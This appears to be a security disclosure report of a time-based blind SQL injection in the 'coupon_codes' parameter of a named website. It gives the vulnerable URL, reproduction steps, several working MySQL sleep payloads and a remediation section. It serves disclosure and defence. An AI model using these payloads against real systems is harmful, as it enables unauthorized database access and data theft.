# SQL Injection - Time-Based Blind

## Summary

I identified a Time-Based Blind SQL Injection vulnerability in the application.

The application accepts user-controlled input through the `coupon_codes` parameter and concatenates it directly into SQL queries without proper sanitization or parameterization. By injecting time-based SQL payloads, an attacker can infer database information based on the response time of the server. The payloads cause the database to sleep for a specified duration, confirming the presence of a SQL injection vulnerability.

An attacker can craft malicious inputs that cause the database to delay its response, allowing the attacker to determine if the injection was successful.

## Vulnerability Type

**SQL Injection (Time-Based Blind)**

## Vulnerable Parameter

```text
coupon_codes
```

## Vulnerable URL

```text
https://kzlab.in/index.php?coupon_codes=akb
```

## Steps to Reproduce

1. Intercept a request using Burp Suite or similar proxy tool.

2. Replace the parameter value with a time-based payload:

   ```text
   if(1=1, sleep(10),0)
   ```

3. Send the request.

4. Observe that the server takes approximately 10 seconds to respond, confirming successful injection.

## Payloads Used

```text
0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
1'XOR(94102*if(now()=sysdate(),sleep(10),0))XOR'Z
'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
if(1=1, sleep(10),0)
```

## Proof of Concept

The application takes user input and concatenates it into a SQL query:

```sql
SELECT * FROM table WHERE coupon_codes = 'akb'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z'
```

When `now()=sysdate()` evaluates to true, the `sleep(10)` function is executed, causing a 10-second delay.
<img width="1901" height="620" alt="Screenshot 2026-09-01 131123" src="https://github.com/user-attachments/assets/7f889526-915f-4525-9c2e-718a7f23bd0b" />
<img width="1612" height="492" alt="Screenshot 2026-09-01 131134" src="https://github.com/user-attachments/assets/9f188a54-5db5-49d1-9a70-c462b318d900" />

## Impact

An attacker can:

- Enumerate database structure and content
- Extract sensitive data (usernames, passwords)
- Bypass authentication
- Gain unauthorized access

## Recommendation

To mitigate this vulnerability:

- Use **prepared statements** with parameterized queries.
  ```php
  $stmt = $conn->prepare("SELECT * FROM table WHERE coupon_codes = ?");
  $stmt->bind_param("s", $coupon_codes);
  $stmt->execute();
  ```

- Use **input validation** to filter special characters.
  ```php
  $coupon_codes = mysqli_real_escape_string($conn, $_GET['coupon_codes']);
  ```

---
